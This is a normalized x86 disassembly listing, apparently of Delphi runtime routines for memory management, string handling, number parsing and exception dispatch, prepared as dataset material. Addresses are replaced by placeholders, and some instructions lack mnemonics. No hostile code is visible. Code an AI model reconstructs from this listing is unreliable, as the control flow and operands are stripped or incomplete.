cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403ab4
jmp r-xdata
call sub_401eb8
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401bc8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e30
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401bc8
sub_402444
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401eb8
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401bc8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401fbc
test al al
je r-xdata
call sub_401bc8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c8c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e30
jmp r-xdata
sub_402620
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026d1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401a24
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402444
test al al
je r-xdata
push rw-data
call sub_401380
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_402110
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028e0
mov eax ebx
call sub_4022a0
retn
push rw-data
call sub_401388
sub_4026e4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402840
sub_402704
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402840
sub_402724
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402840
mov [ ecx ] eax
mov al 0x2
jmp sub_402840
retn
mov [ ecx ] eax
retn
sub_4027b4
push ebx
push esi
call sub_405dbc
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405dbc
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405dbc
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027f4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405dbc
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027e8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40287c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028e0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402920
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_401234
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_40469c
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_401234
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_401234
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401234
cmp eax ebx
jbe r-xdata
push ebx
call sub_401234
mov ebx eax
jmp r-xdata
push ebx
call sub_401234
mov ebx eax
jmp r-xdata
push ebx
call sub_401234
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_401234
mov ebx eax
jmp r-xdata
push ebx
call sub_401234
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_402a0c
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_404050
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_401284
mov ecx eax
mov edx esp
mov eax ebx
call sub_404140
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_402920
mov edi eax
test esi esi
je r-xdata
sub_402aac
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40286c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402b00
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40286c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40286c
jmp r-xdata
sub_402b58
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b94
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028e0
pop ebx
retn
mov ecx ebx
sub_402bb0
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402c34
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402ca4
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402cc4
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402da4
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402df0
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402ea3 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402ea3 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402ea3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_4030dc
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40310c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_40317d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012d4
retn
sub_4031f8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_4032a0
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032f8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a80
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_403318
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4056a4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4033cc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033dc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4033d3
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_403318
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4056a4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033dc
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_403420
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_4034a8
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403460
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403490
push eax
push ecx
mov eax [ eax ]
call sub_403460
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403fc0
call [ rw-data ]
sub_4034d8
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403460
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_403500
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403550
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_4035a0
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035c9
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403634
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403670
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403684
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403698
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4036b8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403698
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_40371c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4031d0
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405dbc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403684
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403634
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403848
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4031d0
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403634
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405dbc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403670
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
